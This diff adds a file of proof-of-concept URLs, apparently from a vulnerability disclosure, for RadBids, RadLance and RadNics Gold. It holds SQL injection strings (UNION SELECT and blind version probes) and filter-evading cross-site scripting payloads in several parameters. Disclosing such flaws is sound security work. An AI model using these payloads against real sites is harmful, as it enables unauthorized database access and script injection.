@@ -1,0 +1,22 @@
+SQL-injection:
+http://www.example.com/patch/index.php?a=view_forum&amp;fid=[SQL]	
+http://www.example.com/index.php?a=view_forum&amp;fid=null+union+select+1,2,version(),4,5--&amp;admin=0
+http://www.example.com/07.5s1/_plain/index.php?a=view_forum&amp;fid=1%20AND%20SUBSTRING(@@version,1,1)=5&amp;admin=0 TRUE
+http://www.example.com/07.5s1/_plain/index.php?a=view_forum&amp;fid=1%20AND%20SUBSTRING(@@version,1,1)=4&amp;admin=0 FALSE
+
+Cross-site Scripting:
+RadBids Gold:
+http://www.example.com/patch/storefront.php?user=104&amp;mode=[XSS]
+http://www.example.com/auction_software/test/storefront.php?user=104&amp;mode=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(528305396116)%3B&lt;/ScRiPt&gt;
+http://www.example.com/storefront.php?user=104&amp;mode=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(528305396116)%3B&lt;/ScRiPt&gt;
+
+RadLance Gold:
+http://www.example.com/patch/index.php?a=ulist&amp;pr=[XSS]&amp;
+http://www.example.com/07.5s1/_plain/index.php?a=ulist&amp;pr=1&lt;/title&gt;&lt;ScRiPt %0A%0D&gt;alert(566615539956)%3B&lt;/ScRiPt&gt;&amp;
+http://www.example.com/index.php?a=ulist&amp;pr=1&lt;/title&gt;&lt;ScRiPt %0A%0D&gt;alert(566615539956)%3B&lt;/ScRiPt&gt;&amp;
+
+RadNics Gold:
+http://www.example.com/patch/index.php?a=ulist&amp;mode=9&amp;order=[XSS]&amp;cat=1
+http://www.example.com/patch/index.php?a=view_forum&amp;fid=[XSS]&amp;admin=0
+http://www.example.com/v5/052107/index.php?a=ulist&amp;mode=9&amp;order=1&gt;&#039;&gt;&lt;ScRiPt %0A%0D&gt;alert(640795682719)%3B&lt;/ScRiPt&gt;&amp;cat=1
+http://www.example.com/v5/052107/index.php?a=view_forum&amp;fid=1&gt;&#039;&gt;&lt;ScRiPt %0A%0D&gt;alert(664745745195)%3B&lt;/ScRiPt&gt;&amp;admin=0
